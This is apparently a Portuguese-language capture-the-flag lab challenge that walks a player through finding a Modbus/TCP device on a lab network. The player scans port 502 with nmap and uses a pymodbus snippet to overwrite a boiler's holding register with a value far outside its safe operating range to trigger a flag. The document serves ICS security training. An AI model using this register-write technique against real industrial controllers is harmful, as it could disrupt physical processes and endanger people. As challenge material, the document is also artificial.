# Desafio 01 — Reconhecimento: Exploração de Dispositivo Modbus/TCP

> **Contexto:** Você é analista de segurança júnior investigando um incidente
> de disponibilidade na Planta Industrial "Probatio". Um processo crítico
> (caldeira) reportou leituras anômalas. Sua missão é reconstituir, sob
> perspectiva ofensiva, como a intrusão poderia ter ocorrido.

## Objetivo

Descobrir o host industrial na rede do laboratório, identificar o protocolo
de comunicação, ler o valor de uma variável crítica do processo e escrevê-la
para um valor fora da faixa operacional normal, acionando a geração da flag.

---

## Dicas

### 1. Descoberta de hosts

A rede do laboratório é `172.28.0.0/24`. Comece mapeando os hosts ativos:

```bash
nmap -sn 172.28.0.0/24
```

> **Para estudar:** [nmap — Host Discovery](https://nmap.org/book/man-host-discovery.html)

### 2. Scan de portas

O protocolo industrial padrão usa a porta **502/TCP**. Verifique se ela está aberta no host encontrado:

```bash
nmap -p 502 172.28.0.20
```

> **Para estudar:** [nmap — Port Scanning](https://nmap.org/book/man-port-scanning-techniques.html)

### 3. Protocolo Modbus/TCP

Modbus/TCP não possui autenticação nativa. Qualquer cliente pode ler e
escrever registros diretamente. Utilize a biblioteca `pymodbus` (já
instalada neste container) para interagir com o servidor:

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("172.28.0.20", port=502)
client.connect()

# Ler o holding register de endereço 0
result = client.read_holding_registers(address=0, count=1, device_id=1)
print(result.registers)  # Valor inicial: 50

# Escrever um valor fora da faixa normal
client.write_register(address=0, value=200, device_id=1)

client.close()
```

> **Para estudar:** [Especificação Modbus](https://modbus.org/specs.php) · [pymodbus](https://pymodbus.readthedocs.io/en/latest/)

### 4. Variável crítica

A variável de interesse é o **holding register de endereço 0**. A faixa
operacional normal é **20–80**. Para acionar a flag, escreva um valor
**≥ 150** nesse registro.

> **Para estudar:** [Modbus — funções Read/Write Single Register](https://modbus.org/specs.php)

### 5. Ferramentas disponíveis

| Ferramenta   | Uso                                      |
|--------------|------------------------------------------|
| `nmap`       | Descoberta de hosts e portas             |
| `scapy`      | Construção e envio de pacotes customizados |
| `pymodbus`   | Cliente e servidor Modbus/TCP            |
| `ssh`/`sshpass` | Acesso remoto (usado no Desafio 02)   |
| `netcat`     | Conexões TCP genéricas                   |

> **Para estudar:** [scapy](https://scapy.readthedocs.io/en/latest/) · [sshpass](https://manpages.debian.org/bookworm/sshpass/sshpass.1.en.html) · [netcat](https://manpages.debian.org/bookworm/netcat-openbsd/nc.1.en.html)

### 6. Validação da flag

A flag é gerada automaticamente quando o valor do registro crítico atinge
ou ultrapassa 150. Valide-a no frontend: **http://localhost:8080**.

---

## Referências para estudo

Material oficial das ferramentas usadas neste desafio:

| Ferramenta / Tópico | Documentação |
|---------------------|--------------|
| nmap — descoberta de hosts (`-sn`) | <https://nmap.org/book/man-host-discovery.html> |
| nmap — scan de portas | <https://nmap.org/book/man-port-scanning-techniques.html> |
| nmap — guia de referência completo | <https://nmap.org/book/man.html> |
| Especificação Modbus (application protocol V1.1b3) | <https://modbus.org/specs.php> |
| pymodbus — documentação | <https://pymodbus.readthedocs.io/en/latest/> |
| scapy — documentação | <https://scapy.readthedocs.io/en/latest/> |
| netcat — man page | <https://manpages.debian.org/bookworm/netcat-openbsd/nc.1.en.html> |
